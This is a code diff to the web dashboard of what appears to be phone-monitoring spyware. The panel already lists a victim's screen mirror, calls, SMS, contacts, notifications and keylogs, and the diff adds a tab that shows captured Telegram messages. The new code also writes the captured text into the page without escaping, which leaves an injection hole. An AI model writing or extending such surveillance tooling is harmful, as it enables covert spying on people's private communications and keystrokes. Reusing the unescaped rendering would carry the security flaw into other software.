@@ -382,6 +382,7 @@
     <!-- TABS -->
     <div class="tabs-bar">
       <button class="tab-btn active" onclick="switchTab('tab-mirror')">📱 Live Mirror</button>
+      <button class="tab-btn" onclick="switchTab('tab-tg')">🤖 Telegram Feed <span class="tab-badge" id="b-tg">0</span></button>
       <button class="tab-btn" onclick="switchTab('tab-notifs')">🔔 Notifications <span class="tab-badge" id="b-notifs">0</span></button>
       <button class="tab-btn" onclick="switchTab('tab-calls')">📞 Calls <span class="tab-badge" id="b-calls">0</span></button>
       <button class="tab-btn" onclick="switchTab('tab-sms')">✉️ SMS <span class="tab-badge" id="b-sms">0</span></button>
@@ -441,6 +442,15 @@
           </div>
         </div>
       </div>
+    </div>
+
+    <!-- VIEW: TELEGRAM LIVE FEED SYNC -->
+    <div id="tab-tg" class="view-content">
+      <div class="filter-bar">
+        <input type="text" id="filter-tg" placeholder="Търсене в Telegram потока..." oninput="renderTelegramFeed()">
+        <button class="btn-clear" onclick="clearData()">Clear All</button>
+      </div>
+      <div class="data-grid" id="grid-tg"></div>
     </div>
 
     <!-- VIEW 2: NOTIFICATIONS -->
@@ -524,6 +534,7 @@
         if (res.ok) {
           records = await res.json();
           updateBadges();
+          renderTelegramFeed();
           renderNotifs();
           renderCalls();
           renderSms();
@@ -541,11 +552,40 @@
     }
 
     function updateBadges() {
+      document.getElementById('b-tg').textContent = (records.events || []).length;
       document.getElementById('b-notifs').textContent = records.notifications.length;
       document.getElementById('b-calls').textContent = records.calls.length;
       document.getElementById('b-sms').textContent = records.sms.length;
       document.getElementById('b-contacts').textContent = records.contacts.length;
       document.getElementById('b-keylog').textContent = records.keylogs.length;
+    }
+
+    function renderTelegramFeed() {
+      const filter = (document.getElementById('filter-tg')?.value || '').toLowerCase();
+      const grid = document.getElementById('grid-tg');
+      const recent = document.getElementById('recent-stream');
+      const events = records.events || [];
+
+      grid.innerHTML = events
+        .filter(e => (e.event || '').toLowerCase().includes(filter))
+        .map(e => `
+          <div class="event-card type-contact" style="border-left-color: var(--cyan);">
+            <div class="event-header">
+              <span style="color: var(--cyan); font-weight: 800;">🤖 TELEGRAM LIVE EVENT</span>
+              <span>${e.timestamp}</span>
+            </div>
+            <div class="event-body" style="white-space: pre-wrap;">${e.event}</div>
+          </div>
+        `).join('') || '<div style="color: var(--muted);">Няма записани Telegram събития.</div>';
+
+      if (recent && events.length > 0) {
+        recent.innerHTML = events.slice(0, 15).map(e => `
+          <div style="margin-bottom: 6px; border-bottom: 1px solid rgba(255,255,255,0.05); padding-bottom: 4px;">
+            <span style="color: var(--muted); font-size: 10px;">[${e.timestamp}]</span>
+            <div style="color: #9cdcfe; font-size: 11px;">${e.event}</div>
+          </div>
+        `).join('');
+      }
     }
 
     function renderNotifs() {
